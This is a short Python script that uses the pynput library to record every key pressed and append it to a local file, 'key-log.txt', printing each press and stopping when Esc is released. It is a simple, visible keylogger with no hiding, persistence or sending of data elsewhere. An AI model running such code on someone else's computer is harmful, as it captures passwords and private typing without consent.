from pynput.keyboard import Listener, Key


# -- Used when the key is pressed, prints out the pressed key ----------------------
def pressed(key):
    print(f"{key} key was pressed.")


# -- Used to call the function to write pressed keys to a log file -----------------
def released(key):
    if key == Key.esc:
        exit()
    create_log(key)


# -- Writes characters pressed on the keyboard to a log file -----------------------
def create_log(k):
    with open("key-log.txt", "a+") as key_log_file:
        k = str(k).replace("'", "")
        key_log_file.write(k + "\n")


# -- Main Loop ------------------------------------------------------------------------
with Listener(on_press=pressed, on_release=released) as listener:
    listener.join()
